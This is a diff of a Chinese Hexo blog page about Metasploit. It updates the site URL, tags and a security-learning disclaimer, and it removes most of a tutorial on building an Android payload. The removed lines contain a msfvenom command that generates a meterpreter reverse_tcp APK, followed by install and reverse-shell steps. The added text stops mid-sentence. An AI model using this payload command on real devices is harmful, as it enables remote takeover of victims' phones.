@@ -5,12 +5,12 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://yoursite.com">
+  <link rel="dns-prefetch" href="http://y00z.github.io">
   <title>悠哉&#39;的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="website">
 <meta property="og:title" content="悠哉'的博客">
-<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:url" content="http://y00z.github.io/index.html">
 <meta property="og:site_name" content="悠哉'的博客">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="悠哉'的博客">
@@ -156,28 +156,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</p>
+<font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
+
 </blockquote>
 <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。团队合作，在Metasploit和综合报告提出了他们的发现。</p>
-</blockquote>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote>
-<ul>
-<li>BackBox、kali linux、或者BackTrack(kali的前身)</li>
-<li>一台安卓设备</li>
-</ul>
-<p>环境不说太多介绍了，直接来实战。</p>
-<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>装好环境后查看自己的ip<br><img src="/images/pasted-10.png" alt=""></p>
-<p>生成一个payload<br><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk</code><br>p 设置要使用的payload<br>LHOST 设置用来接收反弹连接的主机<br>LPORT 设置用来接收反弹连接的端口</p>
-</blockquote>
-<p><img src="/images/pasted-11.png" alt=""></p>
-<blockquote>
-<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src="/images/pasted-12.png" alt=""></p>
-</blockquote>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>启动msf</p>
-</blockquote>
-
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程
+        
       
 
       
@@ -187,7 +171,7 @@
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安卓/">安卓</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络攻防/">网络攻防</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全攻防/">安全攻防</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安卓/">安卓</a></li></ul>
 	</div>
 
       
@@ -324,15 +308,15 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">安卓</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">网络攻防</a>
+                <a href="javascript:void(0)">安全攻防</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">hexo</a>
               </li>
             
             <div class="clearfix"></div>
